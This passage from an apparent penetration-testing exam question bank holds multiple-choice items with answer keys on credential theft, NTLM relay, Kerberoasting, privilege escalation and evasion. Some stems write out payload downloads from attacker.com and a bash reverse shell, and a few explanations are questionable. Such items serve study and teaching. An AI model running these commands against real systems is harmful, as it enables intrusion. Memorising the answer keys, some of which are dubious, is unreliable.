      "question": "Which of the following techniques would MOST effectively allow a penetration tester to extract cleartext credentials from memory on a Linux system?",
      "options": [
        "Dumping process memory using `gcore` and analyzing the output",
        "Extracting password hashes from `/etc/shadow` and cracking them",
        "Sniffing network traffic for unencrypted authentication credentials",
        "Performing a Pass-the-Hash attack against the target system"
      ],
      "correctAnswerIndex": 0,
      "explanation": "`gcore` can create core dumps of running processes, which may contain cleartext credentials. `/etc/shadow` contains hashed passwords, not plaintext. Sniffing requires unencrypted traffic. Pass-the-Hash is effective for NTLM authentication but does not extract plaintext credentials.",
      "examTip": "Memory dumps can reveal plaintext credentialsâ€”check process memory for sensitive data."
    },
    {
      "id": 43,
      "question": "A penetration tester captures network traffic and observes an HTTP request containing the following header:\n\n```\nAuthorization: Basic dXNlcjpwYXNzd29yZA==\n```\n\nWhat is the PRIMARY security risk associated with this?",
      "options": [
        "Credentials are sent in a reversible encoding format",
        "The password is stored in plaintext on the server",
        "Session hijacking is possible using a captured cookie",
        "An attacker can modify HTTP headers to escalate privileges"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Basic authentication encodes credentials in Base64, which is easily reversible. Password storage depends on server implementation. Session hijacking is unrelated to Basic authentication. HTTP headers can be modified but do not directly escalate privileges.",
      "examTip": "Basic authentication should be replaced with more secure alternatives like OAuth or token-based authentication."
    },
    {
      "id": 44,
      "question": "A penetration tester wants to determine if an SMB share allows anonymous access. Which of the following commands would be the BEST choice?",
      "options": [
        "`smbclient -L //target -N`",
        "`rpcclient -U \"\" -N target`",
        "`enum4linux -a target`",
        "`nmap --script smb-enum-shares target`"
      ],
      "correctAnswerIndex": 0,
      "explanation": "`smbclient -L //target -N` lists available SMB shares without authentication, revealing anonymous access. `rpcclient` is useful but does not specifically enumerate shares. `enum4linux` is comprehensive but not the most direct method. Nmap's SMB scripts provide enumeration but may not be as efficient.",
      "examTip": "`smbclient` is a quick way to check for anonymous SMB share access."
    },
    {
      "id": 45,
      "question": "A penetration tester gains access to a Linux server and finds the following cron job owned by root:\n\n```\n* * * * * root /home/user/backup.sh\n```\n\nWhat is the BEST way to escalate privileges?",
      "options": [
        "Modify `backup.sh` to execute a reverse shell payload",
        "Change `/etc/shadow` permissions to allow password modification",
        "Replace `/usr/bin/sudo` with a backdoored binary",
        "Use `find` to locate world-writable SUID binaries"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Since `backup.sh` runs as root, modifying it allows privilege escalation. `/etc/shadow` permissions require root access. Replacing `sudo` requires additional privileges. Searching for SUID binaries may help but is not as direct as modifying a root-owned cron job.",
      "examTip": "If a root-owned cron job executes a user-controlled script, it can be modified to gain root access."
    },
    {
      "id": 46,
      "question": "Which of the following techniques would MOST likely allow a penetration tester to move laterally within an Active Directory environment?",
      "options": [
        "Extracting and reusing Kerberos TGTs from compromised machines",
        "Capturing NTLMv2 challenge-response hashes over the network",
        "Exploiting a vulnerable web application for remote code execution",
        "Enumerating open SMB shares for misconfigured access permissions"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Extracting and reusing Kerberos TGTs (Pass-the-Ticket) enables lateral movement. Capturing NTLM hashes is useful for authentication but not direct lateral movement. Web app exploits target external entry points, not lateral movement. SMB share enumeration is useful but does not guarantee movement.",
      "examTip": "Pass-the-Ticket attacks allow attackers to reuse Kerberos TGTs for lateral movement within Active Directory."
    },
    {
      "id": 47,
      "question": "A penetration tester wants to detect user accounts with no password expiration in Active Directory. Which of the following commands would be the BEST choice?",
      "options": [
        "`Get-ADUser -Filter * -Properties PasswordNeverExpires`",
        "`Get-ADComputer -Filter * -Properties LastLogonTimestamp`",
        "`dsquery user -limit 0 | dsget user -pwdneverexpires`",
        "`Get-NetUser | Where-Object { $_.PasswordNeverExpires -eq $true }`"
      ],
      "correctAnswerIndex": 0,
      "explanation": "`Get-ADUser` allows querying user attributes, including `PasswordNeverExpires`. `Get-ADComputer` queries machine accounts. `dsquery` can retrieve similar information but is less efficient. `Get-NetUser` is useful but requires additional filtering.",
      "examTip": "Accounts with non-expiring passwords increase security risksâ€”always check for them during AD assessments."
    },
    {
      "id": 48,
      "question": "A penetration tester performs a phishing attack and successfully obtains a userâ€™s NTLMv2 hash. What is the BEST next step to exploit this?",
      "options": [
        "Relay the hash to authenticate against another system",
        "Crack the hash using a dictionary attack",
        "Modify the hash to generate a valid authentication token",
        "Use Kerberoasting to extract additional credentials"
      ],
      "correctAnswerIndex": 0,
      "explanation": "If SMB signing is disabled, NTLM hashes can be relayed to authenticate without cracking. Cracking NTLMv2 hashes is difficult. Modifying NTLM hashes is ineffective. Kerberoasting targets Kerberos, not NTLM authentication.",
      "examTip": "NTLM relay attacks allow authentication without cracking the hashâ€”check SMB signing settings first."
    },
    {
      "id": 49,
      "question": "Which of the following conditions is necessary for a successful Pass-the-Hash (PtH) attack?",
      "options": [
        "The target system must allow NTLM authentication",
        "Kerberos must be disabled on the domain controller",
        "The attacker must have administrative access to the SAM database",
        "The victim's password must be weak and easily guessable"
      ],
      "correctAnswerIndex": 0,
      "explanation": "PtH attacks rely on NTLM authentication being enabled. Kerberos is unrelated to PtH. Access to the SAM database is useful but not required. Weak passwords are not necessary for PtH to succeed.",
      "examTip": "Pass-the-Hash exploits NTLM authenticationâ€”disable NTLM where possible to mitigate this attack."
    },
    {
      "id": 50,
      "question": "A penetration testing team is engaged by a client operating under strict data sovereignty laws. The client insists that all data collected must remain within local data centers and not be shared externally. Which of the following contractual components BEST ensures adherence to these requirements?",
      "options": [
        "Adding a confidentiality clause in the NDA referencing local data privacy regulations",
        "Specifying that all test results be delivered via email with encryption",
        "Inserting a geo-restriction policy in the SoW mandating in-country data storage",
        "Having an informal phone call with the compliance department to confirm data residency needs"
      ],
      "correctAnswerIndex": 2,
      "explanation": "Including explicit geographic data residency obligations in the Statement of Work aligns both parties on data handling and storage requirements, ensuring compliance with local sovereignty laws.",
      "examTip": "Tailor the SoW to include all data residency constraints, referencing relevant regulations to avoid legal pitfalls."
    },
    {
      "id": 51,
      "question": "A penetration tester runs the following command on a Linux system:\n\n```\ncat /proc/1/maps\n```\n\nWhat is the MOST likely objective of this action?",
      "options": [
        "Enumerating memory-mapped files to identify exploitable binaries",
        "Extracting stored SSH keys from the system memory",
        "Listing all active network connections for reconnaissance",
        "Dumping hashed passwords stored in `/etc/shadow`"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `/proc/1/maps` file contains memory-mapped files for the first process (init/systemd), which can help identify exploitable binaries. SSH keys are not stored here. Network connections are found with `netstat` or `ss`. `/etc/shadow` contains password hashes but is not related to memory mapping.",
      "examTip": "Memory-mapped files can reveal potential privilege escalation pathsâ€”check `/proc/[pid]/maps` for insights."
    },
    {
      "id": 52,
      "question": "A penetration tester attempts to perform an NTLM relay attack on a network but notices that authentication fails. What is the MOST likely reason?",
      "options": [
        "SMB signing is enabled on the target system",
        "The captured NTLMv2 hash is incorrectly formatted",
        "Kerberos authentication is being used instead of NTLM",
        "The attacker lacks administrative privileges on the network"
      ],
      "correctAnswerIndex": 0,
      "explanation": "SMB signing prevents NTLM relay attacks by verifying message integrity. NTLMv2 hash formatting is not a common issue. Kerberos authentication does not disable NTLM but may reduce attack success. Administrative privileges are not required for NTLM relay.",
      "examTip": "Check if SMB signing is enabled before attempting NTLM relay attacksâ€”it blocks authentication relays."
    },
    {
      "id": 53,
      "question": "Which of the following tools is BEST suited for discovering cloud misconfigurations in an AWS environment?",
      "options": [
        "Pacu",
        "Nikto",
        "sqlmap",
        "Responder"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Pacu is an AWS exploitation framework designed to identify and exploit misconfigurations. Nikto scans web servers. sqlmap tests for SQL injection. Responder captures network authentication hashes.",
      "examTip": "For AWS security assessments, use tools like `Pacu` to identify misconfigured IAM roles and exposed credentials."
    },
    {
      "id": 54,
      "question": "A penetration tester is attempting to exploit a DLL hijacking vulnerability. What is the MOST effective way to achieve execution?",
      "options": [
        "Placing a malicious DLL in a directory where the application loads dependencies",
        "Modifying the Windows registry to point to a malicious DLL",
        "Injecting a DLL into a running process using reflective loading",
        "Replacing a system DLL in `C:\\Windows\\System32` with a backdoored version"
      ],
      "correctAnswerIndex": 0,
      "explanation": "DLL hijacking exploits the way applications search for and load DLLs, so placing a malicious DLL in a high-priority location ensures execution. Registry modifications can redirect DLLs but do not exploit search order weaknesses. Reflective DLL injection is a separate attack. Replacing system DLLs requires admin privileges and is highly detectable.",
      "examTip": "DLL hijacking exploits how applications load dependenciesâ€”identify weakly protected directories."
    },
    {
      "id": 55,
      "question": "Which of the following commands would be MOST effective for identifying writable files owned by root on a Linux system?",
      "options": [
        "`find / -user root -perm -2 -type f 2>/dev/null`",
        "`ls -la /root | grep rwx`",
        "`grep 'root' /etc/passwd | awk '{print $3}'`",
        "`stat /etc/passwd | grep Write`"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `find` command searches for files writable by anyone (`-perm -2`) and owned by root. `ls -la` only lists directory contents. `grep 'root' /etc/passwd` retrieves user details but not file permissions. `stat` can check individual files but is not efficient for system-wide searches.",
      "examTip": "Writable root-owned files can be leveraged for privilege escalationâ€”always check with `find`."
    },
    {
      "id": 56,
      "question": "A penetration tester executes the following PowerShell command on a Windows target:\n\n```\n(New-Object System.Net.WebClient).DownloadFile('http://attacker.com/payload.exe','C:\\Users\\Public\\payload.exe')\n```\n\nWhat is the PRIMARY goal of this command?",
      "options": [
        "Downloading a remote payload for execution on the target machine",
        "Bypassing UAC to escalate privileges on the system",
        "Extracting credentials stored in memory for post-exploitation",
        "Executing a fileless attack to avoid disk-based detection"
      ],
      "correctAnswerIndex": 0,
      "explanation": "This PowerShell command downloads a file from an external source and saves it locally for execution. It does not escalate privileges, extract credentials, or execute a fileless attack.",
      "examTip": "PowerShell `WebClient` can be used to download and execute malicious payloadsâ€”monitor network traffic for suspicious requests."
    },
    {
      "id": 57,
      "question": "Which of the following conditions would make a Windows machine vulnerable to a Kerberoasting attack?",
      "options": [
        "A service account has a weak password and does not require preauthentication",
        "SMB signing is disabled, allowing NTLM relay attacks",
        "The system is running an outdated version of Windows without security patches",
        "The target machine allows anonymous SMB enumeration"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Kerberoasting exploits weak service account passwords by requesting and cracking Kerberos tickets. SMB signing is unrelated. Outdated software may have vulnerabilities but does not impact Kerberoasting. Anonymous SMB enumeration does not provide Kerberos tickets.",
      "examTip": "Ensure strong passwords for service accountsâ€”weak credentials make Kerberoasting successful."
    },
    {
      "id": 58,
      "question": "A penetration tester executes the following command on a Linux system:\n\n```\nnc -lvp 4444\n```\n\nWhat is the PRIMARY purpose of this command?",
      "options": [
        "Setting up a listener to receive a reverse shell",
        "Performing a port scan to detect open services",
        "Intercepting network traffic for credential harvesting",
        "Injecting a payload into an active network session"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `nc -lvp 4444` command sets up a Netcat listener on port 4444 to receive a reverse shell. It does not perform port scanning, intercept traffic, or inject payloads.",
      "examTip": "A Netcat listener can be used for reverse shellsâ€”ensure proper firewall rules to detect unauthorized access."
    },
    {
      "id": 59,
      "question": "A penetration tester exploits a web application vulnerability and gains access to a server. What is the BEST next step to maintain access?",
      "options": [
        "Create a new user with administrative privileges",
        "Dump all password hashes and attempt to crack them",
        "Exfiltrate all sensitive files from the server",
        "Modify the SSH configuration to allow password authentication"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Creating a new user ensures persistent access. Dumping password hashes is useful but does not maintain immediate access. Exfiltrating files is part of data theft, not persistence. Modifying SSH settings is detectable and may trigger security alerts.",
      "examTip": "Persistence should be stealthyâ€”adding a new user with minimal logging is a common technique."
    },
    {
      "id": 60,
      "question": "Which of the following techniques is MOST effective for evading detection when executing a payload on a Windows system?",
      "options": [
        "Using process injection to execute code within a trusted system process",
        "Running the payload directly from the command line",
        "Saving the payload in a temporary directory before execution",
        "Disabling Windows Defender before executing the payload"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Process injection allows malicious code to run within a legitimate process, evading detection. Running the payload directly is easily detected. Saving the file does not provide evasion. Disabling security features is detectable and requires administrative privileges.",
      "examTip": "Process injection techniques like `reflective DLL injection` can help evade endpoint detection systems."
    },
    {
      "id": 61,
      "question": "A penetration tester gains initial access to a Linux system and wants to escalate privileges. Which of the following commands would be the BEST first step?",
      "options": [
        "`sudo -l` to check for misconfigured sudo privileges",
        "`ls -la /root/` to look for sensitive files",
        "`ps aux` to enumerate running processes for hijacking",
        "`find / -perm -4000 -type f 2>/dev/null` to identify SUID binaries"
      ],
      "correctAnswerIndex": 0,
      "explanation": "`sudo -l` lists sudo privileges, which may allow command execution as root. Listing `/root/` files does not guarantee privilege escalation. Process enumeration is useful but not a primary escalation technique. Searching for SUID binaries is valuable but should come after checking sudo privileges.",
      "examTip": "Always start with `sudo -l` to check for misconfigurations that allow privilege escalation."
    },
    {
      "id": 62,
      "question": "A penetration tester runs the following command on a compromised Windows machine:\n\n```\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /v Domain\n```\n\nWhat information is the tester MOST likely trying to obtain?",
      "options": [
        "The target's Active Directory domain name",
        "A list of saved Wi-Fi network SSIDs",
        "The systemâ€™s current IP address and subnet",
        "The NTLM hash of the logged-in user"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Querying `HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters` reveals the Active Directory domain name. Wi-Fi SSIDs are stored in `HKLM\\SOFTWARE\\Microsoft\\WlanSvc`. IP addresses are retrieved with `ipconfig`. NTLM hashes are extracted from LSASS memory.",
      "examTip": "The registry contains valuable reconnaissance dataâ€”query network settings to identify domain environments."
    },
    {
      "id": 63,
      "question": "A penetration tester intercepts the following HTTP request containing a Base64-encoded authorization header:\n\n```\nAuthorization: Basic YWRtaW46cGFzc3dvcmQ=\n```\n\nWhich of the following actions would be the BEST next step?",
      "options": [
        "Decode the value to extract the plaintext credentials",
        "Attempt a Pass-the-Hash attack using the encoded string",
        "Modify the request to test for SQL injection vulnerabilities",
        "Relay the authentication request to escalate privileges"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Basic authentication encodes credentials in Base64, which can be easily decoded. Pass-the-Hash requires NTLM hashes, not Base64-encoded credentials. SQL injection targets databases, not authentication headers. Relaying requires NTLM authentication, not Basic authentication.",
      "examTip": "Basic authentication is insecureâ€”Base64-encoded credentials can be trivially decoded."
    },
    {
      "id": 64,
      "question": "A penetration tester is conducting a wireless security assessment and detects a network using WEP encryption. What is the MOST effective attack?",
      "options": [
        "Capturing IV packets and cracking the key using aircrack-ng",
        "Performing a brute-force attack against the WPA2 passphrase",
        "Exploiting a vulnerability in the WPA3 handshake process",
        "Conducting a deauthentication attack to force re-authentication"
      ],
      "correctAnswerIndex": 0,
      "explanation": "WEP is vulnerable to key cracking by capturing IV packets and using tools like `aircrack-ng`. WPA2 brute-force attacks require significant computing power. WPA3 handshake vulnerabilities do not affect WEP. Deauthentication attacks disrupt connections but do not recover encryption keys.",
      "examTip": "WEP encryption is outdated and highly vulnerableâ€”use `aircrack-ng` to quickly crack weak WEP keys."
    },
    {
      "id": 65,
      "question": "A penetration tester gains access to a Windows system and executes the following command:\n\n```\nwmic shadowcopy call create Volume='C:\\'\n```\n\nWhat is the MOST likely objective of this action?",
      "options": [
        "Creating a volume shadow copy to bypass file locks and extract data",
        "Modifying Windows backup settings to include additional directories",
        "Enumerating running services for potential privilege escalation",
        "Dumping cached user credentials stored in memory"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Creating a shadow copy allows access to locked files, such as `ntds.dit` for credential extraction. Windows backup settings are not modified here. Service enumeration requires `wmic service`. Cached credentials are dumped from LSASS, not shadow copies.",
      "examTip": "Shadow copies allow attackers to extract sensitive system files without active locks."
    },
    {
      "id": 66,
      "question": "A penetration tester executes the following command:\n\n```\nldapsearch -x -h 192.168.1.10 -b \"dc=corp,dc=local\"\n```\n\nWhat is the tester attempting to do?",
      "options": [
        "Enumerate users and groups in an Active Directory environment",
        "Perform a brute-force attack against LDAP authentication",
        "Capture Kerberos TGTs for offline password cracking",
        "Bypass network segmentation by querying an external directory service"
      ],
      "correctAnswerIndex": 0,
      "explanation": "`ldapsearch` queries LDAP directories, often used to enumerate users and groups in AD. It does not perform brute-force attacks. Kerberos TGTs are extracted using `Rubeus` or `Mimikatz`, not LDAP queries. LDAP does not bypass network segmentation.",
      "examTip": "LDAP enumeration can reveal valuable user and group informationâ€”use `ldapsearch` for reconnaissance."
    },
    {
      "id": 67,
      "question": "Which of the following techniques would MOST effectively evade antivirus detection when executing a payload on a Windows system?",
      "options": [
        "Using process injection to execute the payload within a legitimate system process",
        "Encoding the payload in Base64 and running it via PowerShell",
        "Compiling the payload as an EXE and executing it from a temporary folder",
        "Disabling Windows Defender using Group Policy modifications"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Process injection allows execution within a trusted process, reducing detection. Base64 encoding is easily decoded. Running from a temporary folder does not evade detection. Disabling Defender is noisy and requires administrative privileges.",
      "examTip": "Process injection techniques like DLL injection help evade detection by running malicious code within legitimate processes."
    },
    {
      "id": 68,
      "question": "A penetration tester discovers that a server is vulnerable to an insecure deserialization attack. What is the BEST exploitation method?",
      "options": [
        "Crafting a malicious serialized object to achieve remote code execution",
        "Injecting a SQL payload to bypass authentication",
        "Performing a brute-force attack against user credentials",
        "Modifying HTTP headers to escalate privileges"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Insecure deserialization allows attackers to craft serialized objects that can execute arbitrary code. SQL injection targets databases, not deserialization. Brute-force attacks are not related. HTTP header modification does not exploit deserialization flaws.",
      "examTip": "Insecure deserialization vulnerabilities can lead to remote code executionâ€”use `ysoserial` to craft payloads."
    },
    {
      "id": 69,
      "question": "A penetration tester performs a phishing attack and successfully obtains a userâ€™s NTLM hash. What is the BEST next step?",
      "options": [
        "Relay the hash to authenticate against a network service",
        "Modify the hash to escalate privileges",
        "Use the hash in a Kerberoasting attack",
        "Inject the hash into a web authentication request"
      ],
      "correctAnswerIndex": 0,
      "explanation": "If SMB signing is disabled, NTLM hashes can be relayed for authentication. Modifying NTLM hashes is ineffective. Kerberoasting targets Kerberos authentication, not NTLM. Web authentication typically does not use NTLM hashes.",
      "examTip": "NTLM relay attacks allow authentication without cracking the hashâ€”check SMB signing settings first."
    },
    {
      "id": 70,
      "question": "Which of the following is a common persistence technique used by attackers on macOS systems?",
      "options": [
        "Creating a LaunchAgent to execute a malicious payload on startup",
        "Modifying Windows registry Run keys for automatic execution",
        "Injecting a payload into LSASS for credential harvesting",
        "Exploiting SMB signing to perform an NTLM relay attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "LaunchAgents are a common macOS persistence technique. Windows registry modifications apply to Windows. LSASS injection is a Windows attack. SMB signing affects NTLM relay, unrelated to macOS persistence.",
      "examTip": "MacOS persistence often involves LaunchAgents, LaunchDaemons, or modifying system startup files."
    },
    {
      "id": 71,
      "question": "A penetration tester runs the following command on a Windows machine:\n\n```\ncertutil -urlcache -f http://attacker.com/payload.exe C:\\Users\\Public\\payload.exe\n```\n\nWhat is the PRIMARY goal of this action?",
      "options": [
        "Downloading a malicious payload while avoiding security detections",
        "Extracting digital certificate information for privilege escalation",
        "Enumerating user permissions within the Windows certificate store",
        "Generating a self-signed certificate to bypass TLS restrictions"
      ],
      "correctAnswerIndex": 0,
      "explanation": "`certutil` is commonly used for downloading payloads while evading security detections. Extracting certificate information is done with `certutil -store`. Enumerating user permissions requires different commands. Generating a self-signed certificate is unrelated to this command.",
      "examTip": "Attackers often use `certutil` to download malware while avoiding network security monitoring."
    },
    {
      "id": 72,
      "question": "A penetration tester executes the following command on a compromised Linux system:\n\n```\necho 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1' > /tmp/.backdoor.sh\nchmod +x /tmp/.backdoor.sh\n```\n\nWhat is the PRIMARY objective of this command?",
      "options": [
        "Creating a reverse shell for persistent access",
        "Enumerating writable directories for privilege escalation",
        "Dumping credentials from system memory",
        "Injecting a payload into a running process"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The command writes a reverse shell script to `/tmp/.backdoor.sh` and makes it executable, allowing remote access. It does not enumerate writable directories, dump credentials, or inject payloads into processes.",
      "examTip": "Reverse shells are often hidden in temporary directoriesâ€”monitor `/tmp` for unauthorized scripts."
    },
    {
      "id": 73,
      "question": "A penetration tester discovers that an organizationâ€™s internal DNS allows zone transfers. What is the MOST significant risk?",
      "options": [
        "An attacker can enumerate all subdomains and internal infrastructure details",
        "User credentials can be extracted from cached DNS queries",
        "The DNS server can be poisoned to redirect traffic to malicious sites",
        "Kerberos authentication can be bypassed using crafted DNS responses"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Unrestricted DNS zone transfers expose internal hostnames, IP addresses, and infrastructure details. Cached DNS queries do not store user credentials. DNS poisoning is a separate attack type. Kerberos authentication is independent of DNS zone transfers.",
      "examTip": "Always restrict DNS zone transfers to authorized servers to prevent internal reconnaissance."
    },
    {
      "id": 74,
      "question": "A penetration tester gains access to a Windows server and executes the following command:\n\n```\nrundll32.exe shell32.dll,Control_RunDLL C:\\Windows\\System32\\ncpa.cpl\n```\n\nWhat is the tester attempting to accomplish?",
      "options": [
        "Opening network connections settings to modify configurations",
        "Executing a malicious DLL via `rundll32.exe`",
        "Creating a new network adapter to bypass security monitoring",
        "Hijacking an existing Windows service for privilege escalation"
      ],
      "correctAnswerIndex": 0,
      "explanation": "This command opens the network connections settings using `rundll32.exe`. Executing malicious DLLs requires different parameters. Creating new network adapters requires administrative privileges. Service hijacking involves modifying service binaries.",
      "examTip": "Attackers may use `rundll32.exe` to launch system utilities while bypassing direct execution logs."
    },
    {
      "id": 75,
      "question": "A penetration tester executes the following PowerShell command:\n\n```\n$creds = Get-Credential\n```\n\nWhat is the MOST likely objective of this action?",
      "options": [
        "Prompting the user for credentials to capture them",
        "Extracting saved credentials from Windows Credential Manager",
        "Enumerating Active Directory users with weak passwords",
        "Dumping NTLM hashes from the Windows registry"
      ],
      "correctAnswerIndex": 0,
      "explanation": "`Get-Credential` prompts the user for input, allowing credential capture. Credential Manager data is accessed with `vaultcmd`. Active Directory enumeration requires different tools. NTLM hashes are extracted using `Mimikatz` or registry queries.",
      "examTip": "Phishing techniques using `Get-Credential` can trick users into entering sensitive information."
    },
    {
      "id": 76,
      "question": "Which of the following attack techniques would be MOST effective against a web application using weak JWT authentication?",
      "options": [
        "Forging a new token by cracking the signing key",
        "Performing an XSS attack to steal JWT tokens",
        "Injecting SQL payloads to bypass authentication",
        "Modifying HTTP headers to escalate privileges"
      ],
      "correctAnswerIndex": 0,
      "explanation": "JWT tokens are secured by signing keysâ€”if weak, they can be cracked to forge valid tokens. XSS can steal tokens but does not directly exploit weak signing keys. SQL injection targets databases, not JWTs. Modifying HTTP headers does not bypass JWT security.",
      "examTip": "Check for weak JWT signing keysâ€”attackers can forge tokens if the key is easily guessable."
    },
    {
      "id": 77,
      "question": "A penetration tester discovers an Apache Tomcat server with default credentials. What is the BEST next step?",
      "options": [
        "Deploy a web shell via the Tomcat Manager interface",
        "Perform a brute-force attack against administrative accounts",
        "Enumerate JSP files for potential vulnerabilities",
        "Capture session cookies to hijack authenticated sessions"
      ],
      "correctAnswerIndex": 0,
      "explanation": "If Tomcat has default credentials, deploying a web shell via the Tomcat Manager is an effective method for remote code execution. Brute-force attacks are unnecessary when default credentials are available. JSP enumeration helps but is not the best escalation step. Capturing cookies is useful for session hijacking but does not directly exploit Tomcat misconfigurations.",
      "examTip": "Tomcat often has default credentialsâ€”check `tomcat:tomcat` or `admin:admin` for quick access."
    },
    {
      "id": 78,
      "question": "A penetration tester executes the following command on a Linux system:\n\n```\niptables -L -n\n```\n\nWhat information is the tester attempting to gather?",
      "options": [
        "Firewall rules currently in place on the system",
        "Network routes and default gateways",
        "List of open network ports and listening services",
        "Current ARP table entries for lateral movement"
      ],
      "correctAnswerIndex": 0,
      "explanation": "`iptables -L -n` lists active firewall rules. Network routes are viewed with `route -n`. Open ports are found with `netstat -tulnp`. The ARP table is viewed with `arp -a`.",
      "examTip": "Check firewall rules to identify network restrictions or misconfigurations that can be bypassed."
    },
    {
      "id": 79,
      "question": "A penetration tester extracts the `ntds.dit` file from a Windows domain controller. What is the PRIMARY objective of this action?",
      "options": [
        "Extracting and cracking password hashes for all domain users",
        "Enumerating Group Policy settings applied to domain users",
        "Identifying misconfigured NTLM authentication policies",
        "Recovering Kerberos TGTs for lateral movement"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `ntds.dit` file stores Active Directory password hashes, which can be extracted and cracked. Group Policy settings are stored separately. NTLM policies are configured at the domain level but are not extracted from `ntds.dit`. Kerberos TGTs are obtained through different methods.",
      "examTip": "Extracting `ntds.dit` provides a complete list of domain password hashesâ€”use `secretsdump.py` for extraction."
    },
    {
      "id": 80,
      "question": "A penetration tester is conducting a cloud security assessment and finds an exposed AWS IAM role with the `AdministratorAccess` policy. What is the MOST significant risk?",
      "options": [
        "An attacker can gain full control over the AWS environment",
        "The IAM role can be used to launch phishing attacks",
        "The exposed role allows privilege escalation within a single EC2 instance",
        "The role grants read-only access to all cloud resources"
      ],
      "correctAnswerIndex": 0,
      "explanation": "`AdministratorAccess` provides full control over AWS resources, allowing an attacker to take over the environment. It does not directly facilitate phishing. Privilege escalation is unnecessary when full access is granted. Read-only access is incorrect.",
      "examTip": "Restrict IAM role permissionsâ€”exposed `AdministratorAccess` roles can lead to full AWS compromise."
    },
    {
      "id": 81,
      "question": "A penetration tester captures network traffic and observes the following HTTP request:\n\n```\nGET /admin?session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.somerandomsignature\n```\n\nWhich of the following attack techniques would be MOST effective against this application?",
      "options": [
        "Cracking the JWT secret key to forge an administrative token",
        "Performing an SQL injection attack to extract user credentials",
        "Exploiting an XSS vulnerability to steal authentication tokens",
        "Executing a brute-force attack against the administrator password"
      ],
      "correctAnswerIndex": 0,
      "explanation": "If the JWT secret key is weak, an attacker can crack it and generate valid administrator tokens. SQL injection targets databases, not JWT authentication. XSS could steal tokens but does not exploit weak signing keys. Brute-force attacks are ineffective against JWT authentication.",
      "examTip": "Use tools like `jwtcrack` to test for weak JWT signing keys that could allow unauthorized token generation."
    },
    {
      "id": 82,
      "question": "A penetration tester gains access to a Linux system and finds the following scheduled cron job:\n\n```\n* * * * * root /usr/local/bin/backup.sh\n```\n\nWhat is the BEST way to escalate privileges?",
      "options": [
        "Modify `backup.sh` to execute a reverse shell payload",
        "Overwrite the `cron` binary with a malicious executable",
        "Modify the `/etc/passwd` file to grant root access",
        "Create a new user with sudo privileges using `useradd`"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Since `backup.sh` runs as root, modifying it to execute a reverse shell would escalate privileges. Overwriting `cron` requires existing root access. Modifying `/etc/passwd` requires elevated privileges. Creating a new user requires root permissions.",
      "examTip": "If a root-owned cron job executes a user-controlled script, modifying it can provide root access."
    },
    {
      "id": 83,
      "question": "A penetration tester discovers a misconfigured AWS S3 bucket with `s3:GetObject` permissions set to `Principal: *`. What is the MOST significant risk?",
      "options": [
        "Anyone on the internet can read files from the bucket",
        "Attackers can upload and execute arbitrary code",
        "The bucket can be leveraged for privilege escalation in IAM roles",
        "The bucket can be used for NTLM relay attacks"
      ],
      "correctAnswerIndex": 0,
      "explanation": "`s3:GetObject` with `Principal: *` allows public read access, exposing sensitive files. Uploading files requires `s3:PutObject`. IAM privilege escalation depends on role configurations. NTLM relay attacks are unrelated to S3 permissions.",
      "examTip": "Always check AWS S3 permissionsâ€”public read access (`Principal: *`) often leads to data exposure."
    },
    {
      "id": 84,
      "question": "A penetration tester wants to enumerate users on an Active Directory domain without triggering account lockouts. Which of the following commands would be MOST effective?",
      "options": [
        "`Get-ADUser -Filter * -Properties Name`",
        "`rpcclient -U \"\" -N target`",
        "`kerbrute userenum -d domain.com users.txt`",
        "`net user /domain`"
      ],
      "correctAnswerIndex": 2,
      "explanation": "`kerbrute userenum` performs Kerberos-based user enumeration without triggering account lockouts. `Get-ADUser` requires authentication. `rpcclient` may reveal users but depends on permissions. `net user /domain` requires domain authentication.",
      "examTip": "Use `kerbrute` for stealthy AD user enumerationâ€”no failed login attempts are logged."
    },
    {
      "id": 85,
      "question": "A penetration tester executes the following command:\n\n```\nwmic process call create \"cmd.exe /c whoami\"\n```\n\nWhat is the primary purpose of this action?",
      "options": [
        "Executing a command remotely using Windows Management Instrumentation (WMI)",
        "Extracting credentials stored in the Windows Credential Manager",
        "Modifying Group Policy Objects (GPO) to escalate privileges",
        "Injecting malicious code into a running system process"
      ],
      "correctAnswerIndex": 0,
      "explanation": "WMI (`wmic process call create`) allows remote or local execution of system commands. Credential extraction requires tools like `Mimikatz`. Modifying GPOs involves registry or AD changes. Code injection requires process manipulation techniques.",
      "examTip": "WMI can be used for remote command executionâ€”disable unnecessary WMI access to reduce risk."
    },
    {
      "id": 86,
      "question": "Which of the following conditions must be met for a successful Kerberoasting attack?",
      "options": [
        "A service account must have a weak password",
        "The domain controller must have SMB signing disabled",
        "The target account must allow NTLM authentication",
        "Kerberos preauthentication must be disabled for all users"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Kerberoasting exploits weak service account passwords by requesting and cracking service tickets offline. SMB signing affects NTLM relay, not Kerberoasting. NTLM authentication does not impact Kerberos ticket security. Preauthentication is not required for Kerberoasting.",
      "examTip": "Ensure strong passwords for service accountsâ€”weak credentials make Kerberoasting highly effective."
    },
    {
      "id": 87,
      "question": "A penetration tester performs an on-path (MitM) attack on an enterprise network and captures NTLM authentication attempts. What is the BEST next step?",
      "options": [
        "Relay the NTLM hash to authenticate against another system",
